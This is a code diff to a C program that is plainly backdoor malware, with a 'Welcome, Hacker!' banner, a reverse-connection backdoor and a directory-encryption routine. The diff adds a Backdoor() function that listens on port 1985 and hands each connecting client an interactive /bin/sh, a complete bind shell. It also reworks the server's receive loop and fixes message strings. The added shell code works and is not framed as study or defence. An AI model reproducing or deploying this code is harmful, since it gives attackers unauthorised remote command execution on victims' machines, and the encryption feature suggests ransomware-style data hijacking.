@@ -21,7 +21,7 @@
 #define trAssert_continue( cond )		{ if( !( cond ) ) continue; }
 #define trAssert( cond )			branch_CodeBegin if( !( cond ) ) return -1; branch_CodeEnd
 
-#define error_handling(message) { fputs(message, stderr); fputc('\n', stderr); exit(1);}
+void error_handling(char *message) { fputs(message, stderr); fputc('\n', stderr); exit(1);}
 
 #define MAX_RECV (16)
 #define MAX_LEN (256)
@@ -29,8 +29,10 @@
 
 // 反向连接用到的远程ip
 char g_ip[MAX_LEN] = {"127.0.0.1"} ;
-// 反向剪径到的端口
-int g_port = 1234 ;
+// 正向连接的端口
+int g_dport = 1985 ;
+// 反向连接的端口
+int g_port = 1986 ;
 // 本地监听的端口
 int g_listenport = 1234 ;
 // 本地要加密的目录
@@ -42,6 +44,9 @@ const char Welcome[] = "Welcome, Hacker!\r\n" ;
 
 // 开启监听服务
 int StartServer(void) ;
+
+// 正向连接后门
+int Backdoor(void) ;
 
 // 反向连接后门
 int ReverseBackdoor(void) ;
@@ -87,7 +92,6 @@ int main(int argc, char **argv)
     strcpy(g_filepath, "/Users/evilknight/document/testEntry") ;
     g_key = 12 ;
 #endif
-
     //ReverseBackdoor() ;
     //EncryptDirector() ;
     StartServer() ;
@@ -105,8 +109,10 @@ int StartServer(void)
     struct sockaddr_in serv_addr = {0};
     struct sockaddr_in clnt_addr = {0};
     socklen_t clnt_addr_size = 0;
+    int nRecv = 0 ;
     char recv_buf[MAX_RECV] = {0} ;
     int nContinue = 1 ;
+    
 
     serv_sock = socket(PF_INET, SOCK_STREAM, 0);
     
@@ -141,9 +147,18 @@ int StartServer(void)
             break;                                  //break while loop
         }
 #else
-        read(clnt_sock, recv_buf, MAX_SIZE) ;
-        puts(recv_buf) ;
-        close(clnt_sock) ;
+        while(1)
+        {
+            nRecv = recv(clnt_sock, recv_buf, MAX_SIZE, 0) ;
+            if(nRecv > 0)
+                printf("recv: %d byte, content: %s", nRecv, recv_buf) ;
+            else
+            {
+                puts("recv failed!") ;
+                close(clnt_sock) ;
+                break ;
+            }   
+        }
 #endif
     }
 
@@ -152,6 +167,62 @@ int StartServer(void)
     shutdown(serv_sock, SHUT_WR) ;
     printf("Server shuts down\n");
 
+    return 0 ;
+}
+
+
+int Backdoor(void)
+{
+    int sock = 0, clnt_sock = 0;
+    int clnt_addr_size = 0 ;
+    struct sockaddr_in server = {0} ;
+    struct sockaddr_in clnt_addr = {0} ;
+    if(0 == g_dport || 65535 < g_dport)
+        return -1 ;
+    
+    if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+    {
+        printf("Couldn't make socket!n"); 
+        return -1 ;
+    }
+
+    server.sin_family = AF_INET;
+    server.sin_port = htons(g_dport);
+    server.sin_addr.s_addr = htonl(INADDR_ANY);;
+
+    if(bind(sock, (struct sockaddr*) &server, sizeof(struct sockaddr)) ==- 1)
+    {
+        printf("Backdoor bind failed !\n") ;
+        close(sock) ;
+        return -1;
+    }
+
+    if(listen(sock, 5)==-1)
+    {
+        printf("Backdoor listen failed !\n") ;
+        close(sock) ;
+        return -1;
+    }
+
+    while(1)
+    {
+        clnt_addr_size = sizeof(clnt_addr);  
+        clnt_sock = accept(sock, (struct sockaddr*)&clnt_addr,&clnt_addr_size);
+        if(clnt_sock != -1)
+        {
+            #define MESSAGE "hacker welcome !\n"
+            send(clnt_sock, MESSAGE, sizeof(MESSAGE), 0);
+            printf("send %s", MESSAGE) ;
+            #undef MESSAGE
+            dup2(clnt_sock, 0);
+            dup2(clnt_sock, 1);
+            dup2(clnt_sock, 2);
+            execl("/bin/sh", "/bin/sh",(char *)0);
+            close(clnt_sock);
+        }   
+    }
+
+    close(sock) ;
     return 0 ;
 }
 
@@ -164,7 +235,7 @@ int ReverseBackdoor(void)
     
     if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
     {
-        printf("Couldn't make socket!n"); 
+        printf("Couldn't make socket!\n"); 
         return -1 ;
     }
 
@@ -178,7 +249,7 @@ int ReverseBackdoor(void)
         close(sock) ;
         return -1;
     }
-    #define MESSAGE "hacker welcome !"
+    #define MESSAGE "hacker welcome !\n"
     send(sock, MESSAGE, sizeof(MESSAGE), 0);
     printf("send %s", MESSAGE) ;
     #undef MESSAGE
